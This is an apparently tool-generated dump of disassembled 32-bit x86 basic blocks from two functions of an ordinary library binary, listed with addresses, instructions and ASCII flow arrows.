0xb01bcd5:	mov	eax, dword ptr [ebp - 0x44]
0xb01bcd8:	mov	eax, dword ptr [eax + 0x14]
0xb01bcdb:	test	eax, eax
0xb01bcdd:	je	0xb01c057
None
|
|
|
v
0xb01ba0e:	mov	eax, dword ptr [ebp - 0x40]
0xb01ba11:	cmp	dword ptr [ebp - 0x38], eax
0xb01ba14:	jge	0xb01bb00
None
|
|
|
v
0xb01b91e:	mov	edi, dword ptr [ebx + 0x366c]
0xb01b924:	test	edi, edi
0xb01b926:	je	0xb01b958
None
|
|
|
v
0xb01bee1:	mov	ecx, dword ptr [ebp - 0x3c]
0xb01bee4:	test	eax, eax
0xb01bee6:	jne	0xb01b84b
None
|
|
|
v
0xb01bdf3:	mov	ecx, dword ptr [ebp - 0x38]
0xb01bdf6:	test	eax, eax
0xb01bdf8:	jne	0xb01c067
None
|
|
|
v
0xb01b9ed:	mov	eax, dword ptr [edi + 0xc]
0xb01b9f0:	cmp	eax, dword ptr [ebp - 0x30]
0xb01b9f3:	jg	0xb01bb28
None
|
|
|
v
0xb01bd98:	mov	dword ptr [ebp - 0x34], ecx
0xb01bd9b:	call	0xb0244e0
None
|
|
|
v
0xb01bfdf:	mov	eax, dword ptr [ebp - 0x30]
0xb01bfe2:	xor	esi, esi
0xb01bfe4:	mov	dword ptr [ebp - 0x2c], ecx
0xb01bfe7:	mov	dword ptr [esp], eax
0xb01bfea:	call	0xb017470
None
|
|
|
v
0xb01bca2:	mov	ecx, dword ptr [ebp - 0x44]
0xb01bca5:	test	ecx, ecx
0xb01bca7:	je	0xb01bf8e
None
|
|
|
v
0xb01bdd3:	ror	edx, 9
0xb01bdd6:	xor	edx, dword ptr gs:[0x18]
0xb01bddd:	mov	dword ptr [esp], edx
0xb01bde0:	mov	dword ptr [ebp - 0x38], ecx
0xb01bde3:	mov	dword ptr [ebp - 0x34], edx
0xb01bde6:	call	0xb123900
None
|
|
|
v
0xb01b7c7:	call	0xb0244e0
None
|
|
|
v
0xb01ba8f:	mov	eax, dword ptr [ebp - 0x30]
0xb01ba92:	cmp	dword ptr [ebp - 0x3c], eax
0xb01ba95:	jne	0xb01bb00
None
|
|
|
v
0xb01bbd7:	mov	edx, dword ptr [edi + 0x14]
0xb01bbda:	mov	esi, dword ptr [eax + 8]
0xb01bbdd:	mov	ecx, dword ptr [eax + 0xc]
0xb01bbe0:	mov	eax, dword ptr [edx + 0x10]
0xb01bbe3:	test	eax, eax
0xb01bbe5:	je	0xb01bbf8
None
|
|
|
v
0xb01bbe8:	mov	edx, dword ptr [edx + 0x14]
0xb01bbeb:	add	esi, dword ptr [eax + 8]
0xb01bbee:	add	ecx, dword ptr [eax + 0xc]
0xb01bbf1:	mov	eax, dword ptr [edx + 0x10]
0xb01bbf4:	test	eax, eax
0xb01bbf6:	jne	0xb01bbe8
None
|
|
|
v
0xb01baae:	test	eax, eax
0xb01bab0:	je	0xb01bba0
None
|
|
|
v
0xb01b819:	xor	eax, dword ptr gs:[0x18]
0xb01b820:	rol	eax, 9
0xb01b823:	mov	dword ptr [esi + 0x18], eax
0xb01b826:	sub	esi, 0x3c
0xb01b829:	sub	edi, 1
0xb01b82c:	test	edi, edi
0xb01b82e:	je	0xb01b849
None
|
|
|
v
0xb01be6c:	mov	edx, dword ptr [ebp - 0x2c]
0xb01be6f:	lea	edi, dword ptr [eax + 1]
0xb01be72:	lea	eax, dword ptr [edx + edi + 0x10]
0xb01be76:	mov	dword ptr [esp], eax
0xb01be79:	mov	dword ptr [ebp - 0x38], edi
0xb01be7c:	call	0xb0173f0
None
|
|
|
v
0xb01bb00:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bb03:	mov	eax, dword ptr [eax + 0x18]
0xb01bb06:	test	eax, eax
0xb01bb08:	mov	dword ptr [ebp - 0x2c], eax
0xb01bb0b:	je	0xb01b958
None
|
|
|
v
0xb01b79a:	test	eax, eax
0xb01b79c:	je	0xb01b857
None
|
|
|
v
0xb01baa0:	mov	eax, dword ptr [edi]
0xb01baa2:	mov	dword ptr [esp], esi
0xb01baa5:	mov	dword ptr [esp + 4], eax
0xb01baa9:	call	0xb07a740
None
|
|
|
v
0xb01be8e:	mov	edx, dword ptr [ebp - 0x2c]
0xb01be91:	lea	eax, dword ptr [eax + 0x10]
0xb01be94:	mov	dword ptr [edi], eax
0xb01be96:	mov	dword ptr [esp], eax
0xb01be99:	mov	dword ptr [esp + 8], edx
0xb01be9d:	mov	edx, dword ptr [ebp - 0x40]
0xb01bea0:	mov	dword ptr [esp + 4], edx
0xb01bea4:	call	0xb07cad0
None
|
|
|
v
0xb01bcc0:	je	0xb01c018
None
|
|
|
v
0xb01bf1d:	mov	dword ptr [eax], 0
0xb01bf23:	mov	eax, dword ptr [ebp + 0xc]
0xb01bf26:	xor	esi, esi
0xb01bf28:	mov	dword ptr [ebp - 0x30], 0
0xb01bf2f:	mov	ecx, 3
0xb01bf34:	mov	dword ptr [eax], 0
0xb01bf3a:	jmp	0xb01be36
None
|
|
|
v
0xb01beec:	mov	dword ptr [esp], edi
0xb01beef:	mov	dword ptr [ebp - 0x2c], ecx
0xb01bef2:	call	0xb017470
None
|
|
|
v
0xb01ba6b:	mov	dword ptr [esp + 4], eax
0xb01ba6f:	mov	dword ptr [esp], esi
0xb01ba72:	call	0xb07a740
None
|
|
|
v
0xb01bd3a:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01bd3d:	sub	esi, 0x3c
0xb01bd40:	test	edi, edi
0xb01bd42:	mov	ecx, dword ptr [ecx + 0x14]
0xb01bd45:	lea	eax, dword ptr [edi - 1]
0xb01bd48:	je	0xb01be27
None
|
|
|
v
0xb01b958:	mov	eax, dword ptr [ebp - 0x34]
0xb01b95b:	mov	eax, dword ptr [eax + 0x18]
0xb01b95e:	test	eax, eax
0xb01b960:	mov	dword ptr [ebp - 0x34], eax
0xb01b963:	je	0xb01bca2
None
|
|
|
v
0xb01be81:	mov	ecx, dword ptr [ebp - 0x3c]
0xb01be84:	test	eax, eax
0xb01be86:	mov	edi, eax
0xb01be88:	je	0xb01b84b
None
|
|
|
v
0xb01b826:	sub	esi, 0x3c
0xb01b829:	sub	edi, 1
0xb01b82c:	test	edi, edi
0xb01b82e:	je	0xb01b849
None
|
|
|
v
0xb01b87e:	sub	esp, 0x30
0xb01b881:	lea	esi, dword ptr [esp + 0x1b]
0xb01b885:	and	esi, 0xfffffff0
0xb01b888:	mov	dword ptr [edi + 0xc], 0
0xb01b88f:	mov	dword ptr [edi + 8], 0
0xb01b896:	mov	dword ptr [edi + 0x10], 0
0xb01b89d:	mov	dword ptr [edi + 4], eax
0xb01b8a0:	mov	eax, dword ptr [ebp - 0x58]
0xb01b8a3:	mov	dword ptr [edi + 0x14], 0
0xb01b8aa:	mov	dword ptr [edi + 0x18], 0
0xb01b8b1:	mov	dword ptr [esi], eax
0xb01b8b3:	mov	dword ptr [esp], eax
0xb01b8b6:	call	0xb07ae80
None
|
|
|
v
0xb01ba5c:	test	eax, eax
0xb01ba5e:	je	0xb01b9c0
None
|
|
|
v
0xb01bb76:	mov	dword ptr [edi + 4], eax
0xb01bb79:	mov	eax, dword ptr [ebp - 0x30]
0xb01bb7c:	mov	dword ptr [edi + 0xc], eax
0xb01bb7f:	mov	eax, dword ptr [ebp - 0x38]
0xb01bb82:	mov	dword ptr [edi + 8], eax
0xb01bb85:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bb88:	mov	dword ptr [edi + 0x10], eax
0xb01bb8b:	mov	eax, dword ptr [ebp - 0x34]
0xb01bb8e:	mov	dword ptr [edi + 0x14], eax
0xb01bb91:	mov	eax, dword ptr [ebp - 0x44]
0xb01bb94:	mov	dword ptr [ebp - 0x44], edi
0xb01bb97:	mov	dword ptr [edi + 0x18], eax
0xb01bb9a:	jmp	0xb01ba02
None
|
|
|
v
0xb01bab6:	mov	edi, dword ptr [edi + 0x18]
0xb01bab9:	test	edi, edi
0xb01babb:	jne	0xb01baa0
None
|
|
|
v
0xb01b7a2:	mov	edx, dword ptr [eax]
0xb01b7a4:	mov	ecx, dword ptr [edx + 8]
0xb01b7a7:	mov	edx, dword ptr [ebp + 0xc]
0xb01b7aa:	mov	dword ptr [ebp - 0x34], ecx
0xb01b7ad:	mov	dword ptr [edx], ecx
0xb01b7af:	mov	eax, dword ptr [eax]
0xb01b7b1:	mov	edx, dword ptr [ebp + 0x10]
0xb01b7b4:	mov	eax, dword ptr [eax + 0xc]
0xb01b7b7:	mov	edi, eax
0xb01b7b9:	mov	dword ptr [ebp - 0x30], eax
0xb01b7bc:	mov	dword ptr [edx], eax
0xb01b7be:	imul	eax, eax, 0x3c
0xb01b7c1:	lea	esi, dword ptr [ecx + eax - 0x3c]
0xb01b7c5:	jmp	0xb01b82c
None
|
|
|
v
0xb01bad3:	mov	dword ptr [edi + 0x18], 0
0xb01bada:	mov	dword ptr [edi + 4], eax
0xb01badd:	mov	eax, dword ptr [ebp - 0x30]
0xb01bae0:	mov	dword ptr [edi + 0xc], eax
0xb01bae3:	mov	eax, dword ptr [ebp - 0x38]
0xb01bae6:	mov	dword ptr [edi + 8], eax
0xb01bae9:	mov	eax, dword ptr [ebp - 0x2c]
0xb01baec:	mov	dword ptr [edi + 0x10], eax
0xb01baef:	mov	eax, dword ptr [ebp - 0x34]
0xb01baf2:	mov	dword ptr [edi + 0x14], eax
0xb01baf5:	mov	eax, dword ptr [ebp - 0x54]
0xb01baf8:	mov	dword ptr [eax], edi
0xb01bafa:	lea	eax, dword ptr [edi + 0x18]
0xb01bafd:	mov	dword ptr [ebp - 0x54], eax
0xb01bb00:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bb03:	mov	eax, dword ptr [eax + 0x18]
0xb01bb06:	test	eax, eax
0xb01bb08:	mov	dword ptr [ebp - 0x2c], eax
0xb01bb0b:	je	0xb01b958
None
|
|
|
v
0xb01bfef:	mov	eax, dword ptr [ebp + 0x10]
0xb01bff2:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01bff5:	mov	dword ptr [ebp - 0x30], 0
0xb01bffc:	mov	dword ptr [eax], 0
0xb01c002:	mov	eax, dword ptr [ebp + 0xc]
0xb01c005:	test	ecx, ecx
0xb01c007:	mov	dword ptr [eax], 0
0xb01c00d:	je	0xb01bfa9
None
|
|
|
v
0xb01be2c:	mov	ecx, dword ptr [ebp + 0xc]
0xb01be2f:	mov	eax, dword ptr [ebp - 0x30]
0xb01be32:	mov	dword ptr [ecx], eax
0xb01be34:	xor	ecx, ecx
0xb01be36:	mov	eax, dword ptr [ebp - 0x48]
0xb01be39:	mov	edx, dword ptr [ebp + 8]
0xb01be3c:	mov	dword ptr [ebp - 0x3c], ecx
0xb01be3f:	test	eax, eax
0xb01be41:	cmove	eax, dword ptr [ebp - 0x4c]
0xb01be45:	test	edx, edx
0xb01be47:	mov	edx, dword ptr [ebp - 0x58]
0xb01be4a:	cmovne	edx, dword ptr [ebp + 8]
0xb01be4e:	mov	edi, eax
0xb01be50:	mov	dword ptr [esp], edx
0xb01be53:	mov	dword ptr [ebp - 0x40], edx
0xb01be56:	call	0xb07ae80
None
|
|
|
v
0xb01bc10:	mov	edi, dword ptr [ebp - 0x3c]
0xb01bc13:	jmp	0xb01bc22
None
|
|
|
v
0xb01b969:	mov	eax, dword ptr [eax + 0xc]
0xb01b96c:	mov	dword ptr [ebp - 0x2c], eax
0xb01b96f:	jmp	0xb01b910
None
|
|
|
v
0xb01ba97:	mov	edi, dword ptr [ebp - 0x50]
0xb01ba9a:	lea	esi, dword ptr [esi]
0xb01baa0:	mov	eax, dword ptr [edi]
0xb01baa2:	mov	dword ptr [esp], esi
0xb01baa5:	mov	dword ptr [esp + 4], eax
0xb01baa9:	call	0xb07a740
None
|
|
|
v
0xb01c060:	xor	esi, esi
0xb01c062:	jmp	0xb01be2c
None
|
|
|
v
0xb01bd20:	imul	eax, edx, 0x3c
0xb01bd23:	lea	esi, dword ptr [ecx + eax - 0x3c]
0xb01bd27:	mov	ecx, dword ptr [ebp - 0x44]
0xb01bd2a:	jmp	0xb01bd53
None
|
|
|
v
0xb01b812:	mov	eax, dword ptr [esi + 0x18]
0xb01b815:	test	eax, eax
0xb01b817:	je	0xb01b826
None
|
|
|
v
0xb01bbf8:	mov	dword ptr [edi + 0xc], esi
0xb01bbfb:	mov	dword ptr [edi + 8], ecx
0xb01bbfe:	mov	edi, dword ptr [edi + 0x18]
0xb01bc01:	test	edi, edi
0xb01bc03:	jne	0xb01bbd0
None
|
|
|
v
0xb01b928:	mov	eax, dword ptr [ebp - 0x34]
0xb01b92b:	mov	esi, dword ptr [eax]
0xb01b92d:	jmp	0xb01b937
None
|
|
|
v
0xb01bc82:	mov	eax, dword ptr [ebp - 0x34]
0xb01bc85:	mov	ecx, dword ptr [ebp - 0x40]
0xb01bc88:	cmp	dword ptr [eax + 8], ecx
0xb01bc8b:	jl	0xb01b91e
None
|
|
|
v
0xb01b8bb:	mov	dword ptr [esi + 0xc], 0
0xb01b8c2:	mov	dword ptr [esi + 8], 0
0xb01b8c9:	mov	dword ptr [esi + 0x10], 0
0xb01b8d0:	mov	dword ptr [esi + 0x14], 0
0xb01b8d7:	mov	dword ptr [esi + 0x18], 0
0xb01b8de:	mov	dword ptr [esi + 4], eax
0xb01b8e1:	lea	eax, dword ptr [esi + 0x18]
0xb01b8e4:	mov	dword ptr [edi + 0x18], esi
0xb01b8e7:	mov	dword ptr [ebp - 0x54], eax
0xb01b8ea:	mov	eax, dword ptr [ebp - 0x50]
0xb01b8ed:	mov	dword ptr [ebp - 0x2c], 0
0xb01b8f4:	mov	dword ptr [ebp - 0x40], 0x7fffffff
0xb01b8fb:	mov	dword ptr [ebp - 0x3c], 0x7fffffff
0xb01b902:	mov	dword ptr [ebp - 0x34], eax
0xb01b905:	mov	dword ptr [ebp - 0x44], 0
0xb01b90c:	lea	esi, dword ptr [esi]
0xb01b910:	mov	eax, dword ptr [ebp - 0x3c]
0xb01b913:	cmp	dword ptr [ebp - 0x2c], eax
0xb01b916:	jg	0xb01b958
None
|
|
|
v
0xb01bd10:	mov	edx, dword ptr [ebp - 0x2c]
0xb01bd13:	test	edx, edx
0xb01bd15:	mov	dword ptr [eax], edx
0xb01bd17:	lea	edi, dword ptr [edx - 1]
0xb01bd1a:	je	0xb01c060
None
|
|
|
v
0xb01ba7f:	mov	eax, dword ptr [ebp - 0x30]
0xb01ba82:	cmp	dword ptr [ebp - 0x3c], eax
0xb01ba85:	jg	0xb01ba97
None
|
|
|
v
0xb01bc22:	mov	esi, dword ptr [eax + 0x10]
0xb01bc25:	mov	ecx, dword ptr [eax + 0x14]
0xb01bc28:	mov	edx, dword ptr [esi + 8]
0xb01bc2b:	add	edx, dword ptr [ecx + 0xc]
0xb01bc2e:	mov	esi, dword ptr [esi + 0xc]
0xb01bc31:	add	esi, dword ptr [ecx + 8]
0xb01bc34:	cmp	edi, edx
0xb01bc36:	mov	dword ptr [eax + 0xc], edx
0xb01bc39:	mov	dword ptr [eax + 8], esi
0xb01bc3c:	jle	0xb01bc18
None
|
|
|
v
0xb01bf8e:	mov	eax, dword ptr [ebp + 0xc]
0xb01bf91:	xor	esi, esi
0xb01bf93:	mov	dword ptr [ebp - 0x30], 0
0xb01bf9a:	mov	dword ptr [eax], 0
0xb01bfa0:	mov	eax, dword ptr [ebp + 0x10]
0xb01bfa3:	mov	dword ptr [eax], 0
0xb01bfa9:	mov	ecx, 1
0xb01bfae:	jmp	0xb01be36
None
|
|
|
v
0xb01b9a4:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b9a7:	mov	ecx, dword ptr [ebp - 0x34]
0xb01b9aa:	mov	esi, dword ptr [ebp - 0x48]
0xb01b9ad:	add	edi, dword ptr [eax + 8]
0xb01b9b0:	mov	eax, dword ptr [eax + 0xc]
0xb01b9b3:	add	eax, dword ptr [ecx + 8]
0xb01b9b6:	mov	dword ptr [ebp - 0x30], edi
0xb01b9b9:	mov	dword ptr [ebp - 0x38], eax
0xb01b9bc:	lea	esi, dword ptr [esi]
0xb01b9c0:	mov	eax, dword ptr [ebp - 0x44]
0xb01b9c3:	test	eax, eax
0xb01b9c5:	mov	edi, eax
0xb01b9c7:	jne	0xb01b9db
None
|
|
|
v
0xb01bf5b:	mov	dword ptr [esi + 0xc], 0
0xb01bf62:	mov	dword ptr [esi + 8], 0
0xb01bf69:	mov	dword ptr [esi + 0x10], 0
0xb01bf70:	mov	dword ptr [esi + 0x14], 0
0xb01bf77:	mov	dword ptr [esi + 0x18], 0
0xb01bf7e:	mov	dword ptr [esi + 4], eax
0xb01bf81:	mov	eax, esi
0xb01bf83:	add	eax, 0x18
0xb01bf86:	mov	dword ptr [ebp - 0x54], eax
0xb01bf89:	jmp	0xb01b8ea
None
|
|
|
v
0xb01bb1c:	mov	eax, dword ptr [ebp - 0x38]
0xb01bb1f:	cmp	dword ptr [edi + 8], eax
0xb01bb22:	jle	0xb01ba02
None
|
|
|
v
0xb01b830:	mov	eax, dword ptr [esi + 8]
0xb01b833:	lea	edx, dword ptr [eax + 1]
0xb01b836:	test	eax, eax
0xb01b838:	mov	dword ptr [esi + 8], edx
0xb01b83b:	jne	0xb01b826
None
|
|
|
v
0xb01bd5b:	mov	eax, dword ptr [ecx + 0x14]
0xb01bd5e:	mov	eax, dword ptr [eax]
0xb01bd60:	mov	dword ptr [esi + 0xc], eax
0xb01bd63:	mov	eax, dword ptr [ebp + 0x10]
0xb01bd66:	mov	edx, dword ptr [ebp - 0x2c]
0xb01bd69:	cmp	dword ptr [eax], edx
0xb01bd6b:	je	0xb01bf00
None
|
|
|
v
0xb01b73d:	add	ebx, 0x18f8c3
0xb01b743:	sub	esp, 0x6c
0xb01b746:	mov	edi, dword ptr [ebp + 8]
0xb01b749:	test	edx, edx
0xb01b74b:	mov	dword ptr [ebp - 0x4c], eax
0xb01b74e:	mov	eax, edx
0xb01b750:	cmove	eax, esi
0xb01b753:	mov	dword ptr [ebp - 0x24], eax
0xb01b756:	test	edi, edi
0xb01b758:	mov	dword ptr [ebp - 0x48], edx
0xb01b75b:	mov	edx, ecx
0xb01b75d:	lea	eax, dword ptr [ebx - 0x18f9f0]
0xb01b763:	cmovne	edx, dword ptr [ebp + 8]
0xb01b767:	mov	dword ptr [ebp - 0x5c], eax
0xb01b76a:	mov	dword ptr [esp + 8], eax
0xb01b76e:	lea	eax, dword ptr [ebx + 0xfac]
0xb01b774:	mov	dword ptr [ebp - 0x60], eax
0xb01b777:	mov	dword ptr [esp + 4], eax
0xb01b77b:	lea	eax, dword ptr [ebp - 0x28]
0xb01b77e:	mov	dword ptr [esp], eax
0xb01b781:	mov	dword ptr [ebp - 0x58], ecx
0xb01b784:	mov	dword ptr [ebp - 0x28], edx
0xb01b787:	mov	dword ptr [ebp - 0x20], 0
0xb01b78e:	mov	dword ptr [ebp - 0x1c], 0
0xb01b795:	call	0xb0e7ee0
None
|
|
|
v
0xb01bb60:	sub	esp, 0x30
0xb01bb63:	lea	edx, dword ptr [esp + 0x1b]
0xb01bb67:	and	edx, 0xfffffff0
0xb01bb6a:	mov	dword ptr [edx], esi
0xb01bb6c:	mov	edi, edx
0xb01bb6e:	mov	dword ptr [esp], esi
0xb01bb71:	call	0xb07ae80
None
|
|
|
v
0xb01c00f:	jmp	0xb01be36
None
|
|
|
v
0xb01b980:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b983:	mov	esi, dword ptr [eax + 4]
0xb01b986:	cmp	byte ptr [esi], 0x2d
0xb01b989:	jne	0xb01ba38
None
|
|
|
v
0xb01b730:	push	ebp
0xb01b731:	mov	ebp, esp
0xb01b733:	push	edi
0xb01b734:	push	esi
0xb01b735:	mov	esi, eax
0xb01b737:	push	ebx
0xb01b738:	call	0xb1267db
None
|
|
|
v
0xb01bb11:	mov	eax, dword ptr [ebp - 0x34]
0xb01bb14:	mov	edi, dword ptr [eax + 0xc]
0xb01bb17:	jmp	0xb01b980
None
|
|
|
v
0xb01bf15:	mov	dword ptr [ebp - 0x44], eax
0xb01bf18:	jmp	0xb01bcc6
None
|
|
|
v
0xb01bdeb:	mov	edx, dword ptr [ebp - 0x34]
0xb01bdee:	mov	dword ptr [esp], esi
0xb01bdf1:	call	edx
None
|
|
|
v
0xb01b8ea:	mov	eax, dword ptr [ebp - 0x50]
0xb01b8ed:	mov	dword ptr [ebp - 0x2c], 0
0xb01b8f4:	mov	dword ptr [ebp - 0x40], 0x7fffffff
0xb01b8fb:	mov	dword ptr [ebp - 0x3c], 0x7fffffff
0xb01b902:	mov	dword ptr [ebp - 0x34], eax
0xb01b905:	mov	dword ptr [ebp - 0x44], 0
0xb01b90c:	lea	esi, dword ptr [esi]
0xb01b910:	mov	eax, dword ptr [ebp - 0x3c]
0xb01b913:	cmp	dword ptr [ebp - 0x2c], eax
0xb01b916:	jg	0xb01b958
None
|
|
|
v
0xb01bcf5:	mov	dword ptr [esp], eax
0xb01bcf8:	mov	dword ptr [ebp - 0x2c], edx
0xb01bcfb:	call	0xb0173f0
None
|
|
|
v
0xb01b7f1:	test	eax, eax
0xb01b7f3:	je	0xb01b826
None
|
|
|
v
0xb01bd53:	test	edi, edi
0xb01bd55:	je	0xb01c082
None
|
|
|
v
0xb01bcb4:	mov	ecx, dword ptr [ecx + 0xc]
0xb01bcb7:	cmp	dword ptr [eax + 0xc], ecx
0xb01bcba:	jl	0xb01bf15
None
|
|
|
v
0xb01b862:	mov	ecx, dword ptr [ebp + 8]
0xb01b865:	sub	esp, 0x30
0xb01b868:	lea	eax, dword ptr [esp + 0x1b]
0xb01b86c:	and	eax, 0xfffffff0
0xb01b86f:	mov	edi, eax
0xb01b871:	mov	dword ptr [eax], ecx
0xb01b873:	mov	dword ptr [esp], ecx
0xb01b876:	mov	dword ptr [ebp - 0x50], eax
0xb01b879:	call	0xb07ae80
None
|
|
|
v
0xb01bc3e:	mov	eax, dword ptr [eax + 0x18]
0xb01bc41:	mov	edi, edx
0xb01bc43:	mov	dword ptr [ebp - 0x40], esi
0xb01bc46:	test	eax, eax
0xb01bc48:	jne	0xb01bc22
None
|
|
|
v
0xb01bda8:	mov	edx, dword ptr [eax]
0xb01bdaa:	mov	dword ptr [esi], eax
0xb01bdac:	mov	ecx, dword ptr [ebp - 0x34]
0xb01bdaf:	mov	dword ptr [esi + 4], edx
0xb01bdb2:	mov	edx, dword ptr [eax + 0xc]
0xb01bdb5:	mov	dword ptr [esi + 0x14], edx
0xb01bdb8:	mov	edx, dword ptr [eax + 0x10]
0xb01bdbb:	mov	eax, dword ptr [eax + 0x14]
0xb01bdbe:	mov	dword ptr [esi + 0x18], 0
0xb01bdc5:	test	edx, edx
0xb01bdc7:	mov	dword ptr [esi + 0x1c], edx
0xb01bdca:	mov	dword ptr [esi + 0x20], eax
0xb01bdcd:	je	0xb01bd3d
None
|
|
|
v
0xb01babd:	sub	esp, 0x30
0xb01bac0:	lea	edx, dword ptr [esp + 0x1b]
0xb01bac4:	and	edx, 0xfffffff0
0xb01bac7:	mov	dword ptr [edx], esi
0xb01bac9:	mov	edi, edx
0xb01bacb:	mov	dword ptr [esp], esi
0xb01bace:	call	0xb07ae80
None
|
|
|
v
0xb01bfbf:	imul	esi, edi, 0x3c
0xb01bfc2:	add	esi, dword ptr [ebp - 0x30]
0xb01bfc5:	mov	eax, esi
0xb01bfc7:	add	edi, 1
0xb01bfca:	mov	dword ptr [ebp - 0x2c], ecx
0xb01bfcd:	add	esi, 0x3c
0xb01bfd0:	call	0xb01b6a0
None
|
|
|
v
0xb01bc58:	mov	ecx, dword ptr [ebp - 0x40]
0xb01bc5b:	cmp	ecx, esi
0xb01bc5d:	cmovle	esi, ecx
0xb01bc60:	mov	dword ptr [ebp - 0x40], esi
0xb01bc63:	jmp	0xb01bc1a
None
|
|
|
v
0xb01b98f:	cmp	byte ptr [esi + 1], 0
0xb01b993:	jne	0xb01ba38
None
|
|
|
v
0xb01bbfe:	mov	edi, dword ptr [edi + 0x18]
0xb01bc01:	test	edi, edi
0xb01bc03:	jne	0xb01bbd0
None
|
|
|
v
0xb01c018:	mov	ecx, dword ptr [ebp - 0x44]
0xb01c01b:	mov	edx, dword ptr [ecx + 8]
0xb01c01e:	cmp	dword ptr [eax + 8], edx
0xb01c021:	cmovge	eax, ecx
0xb01c024:	mov	dword ptr [ebp - 0x44], eax
0xb01c027:	jmp	0xb01bcc6
None
|
|
|
v
0xb01be27:	mov	eax, dword ptr [ebp + 0x10]
0xb01be2a:	mov	esi, dword ptr [eax]
0xb01be2c:	mov	ecx, dword ptr [ebp + 0xc]
0xb01be2f:	mov	eax, dword ptr [ebp - 0x30]
0xb01be32:	mov	dword ptr [ecx], eax
0xb01be34:	xor	ecx, ecx
0xb01be36:	mov	eax, dword ptr [ebp - 0x48]
0xb01be39:	mov	edx, dword ptr [ebp + 8]
0xb01be3c:	mov	dword ptr [ebp - 0x3c], ecx
0xb01be3f:	test	eax, eax
0xb01be41:	cmove	eax, dword ptr [ebp - 0x4c]
0xb01be45:	test	edx, edx
0xb01be47:	mov	edx, dword ptr [ebp - 0x58]
0xb01be4a:	cmovne	edx, dword ptr [ebp + 8]
0xb01be4e:	mov	edi, eax
0xb01be50:	mov	dword ptr [esp], edx
0xb01be53:	mov	dword ptr [ebp - 0x40], edx
0xb01be56:	call	0xb07ae80
None
|
|
|
v
0xb01bce3:	xor	edx, edx
0xb01bce5:	lea	esi, dword ptr [esi]
0xb01bce8:	mov	eax, dword ptr [eax + 0x14]
0xb01bceb:	add	edx, 1
0xb01bcee:	test	eax, eax
0xb01bcf0:	jne	0xb01bce8
None
|
|
|
v
0xb01b83d:	mov	eax, dword ptr [esi + 4]
0xb01b840:	test	eax, eax
0xb01b842:	jne	0xb01b7c7
None
|
|
|
v
0xb01b857:	mov	eax, dword ptr [ebp + 8]
0xb01b85a:	test	eax, eax
0xb01b85c:	je	0xb01bf3f
None
|
|
|
v
0xb01bef7:	mov	ecx, dword ptr [ebp - 0x2c]
0xb01befa:	jmp	0xb01b84b
None
|
|
|
v
0xb01b937:	mov	eax, dword ptr [edi]
0xb01b939:	mov	dword ptr [esp], esi
0xb01b93c:	mov	dword ptr [esp + 4], eax
0xb01b940:	call	0xb07a740
None
|
|
|
v
0xb01ba87:	mov	eax, dword ptr [ebp - 0x38]
0xb01ba8a:	cmp	dword ptr [ebp - 0x40], eax
0xb01ba8d:	jle	0xb01bb00
None
|
|
|
v
0xb01bb28:	mov	eax, dword ptr [ebp - 0x2c]
0xb01bb2b:	mov	dword ptr [edi + 0x10], eax
0xb01bb2e:	mov	eax, dword ptr [ebp - 0x34]
0xb01bb31:	mov	dword ptr [edi + 0x14], eax
0xb01bb34:	mov	eax, dword ptr [ebp - 0x30]
0xb01bb37:	mov	dword ptr [edi + 0xc], eax
0xb01bb3a:	mov	eax, dword ptr [ebp - 0x38]
0xb01bb3d:	mov	dword ptr [edi + 8], eax
0xb01bb40:	mov	eax, dword ptr [ebp - 0x30]
0xb01bb43:	cmp	dword ptr [ebp - 0x3c], eax
0xb01bb46:	jle	0xb01ba0e
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01c160
TOTAL BLOCKS :55
0xb01c1b6:	mov	eax, dword ptr [ebp + 0xc]
0xb01c1b9:	mov	edx, edi
0xb01c1bb:	mov	ecx, dword ptr [ebp - 0x1c]
0xb01c1be:	mov	dword ptr [esp + 4], eax
0xb01c1c2:	mov	eax, dword ptr [ebp + 8]
0xb01c1c5:	mov	dword ptr [esp], eax
0xb01c1c8:	mov	eax, esi
0xb01c1ca:	call	0xb023f90
None
|
|
|
v
0xb01c160:	push	ebp
0xb01c161:	mov	ebp, esp
0xb01c163:	push	edi
0xb01c164:	mov	edi, edx
0xb01c166:	push	esi
0xb01c167:	mov	esi, eax
0xb01c169:	push	ebx
0xb01c16a:	call	0xb1267db
None
|
|
|
v
0xb01c31f:	mov	eax, dword ptr [ebp - 0x20]
0xb01c322:	test	eax, eax
0xb01c324:	je	0xb01c22b
None
|
|
|
v
0xb01c200:	mov	edx, dword ptr [ebx + 0x366c]
0xb01c206:	test	edx, edx
0xb01c208:	je	0xb01c2d0
None
|
|
|
v
0xb01c30c:	mov	dword ptr [esp], edx
0xb01c30f:	mov	dword ptr [esp + 4], edi
0xb01c313:	call	0xb07a740
None
|
|
|
v
0xb01c2ad:	jmp	0xb01c197
None
|
|
|
v
0xb01c1cf:	sub	esp, 8
0xb01c1d2:	cmp	eax, 2
0xb01c1d5:	mov	edx, eax
0xb01c1d7:	je	0xb01c200
None
|
|
|
v
0xb01c22b:	mov	eax, dword ptr [ebp + 8]
0xb01c22e:	mov	ecx, edi
0xb01c230:	mov	dword ptr [esp + 8], eax
0xb01c234:	mov	eax, dword ptr [ebp - 0x1c]
0xb01c237:	mov	dword ptr [esp + 4], eax
0xb01c23b:	mov	eax, dword ptr [ebp - 0x20]
0xb01c23e:	mov	dword ptr [esp], eax
0xb01c241:	mov	eax, esi
0xb01c243:	call	0xb01b730
None
|
|
|
v
0xb01c37a:	or	eax, 0xffffffff
0xb01c37d:	jmp	0xb01c1f3
None
|
|
|
v
0xb01c348:	mov	eax, dword ptr [ebp - 0x20]
0xb01c34b:	mov	dword ptr [esp], edx
0xb01c34e:	mov	dword ptr [esp + 4], eax
0xb01c352:	call	0xb07a740
None
|
|
|
v
0xb01c1f3:	lea	esp, dword ptr [ebp - 0xc]
0xb01c1f6:	pop	ebx
0xb01c1f7:	pop	esi
0xb01c1f8:	pop	edi
0xb01c1f9:	pop	ebp
0xb01c1fa:	ret	8
None
|
|
|
v
0xb01c1d9:	cmp	dword ptr gs:[0xc], 0
0xb01c1e1:	je	0xb01c1e4
None
|
|
|
v
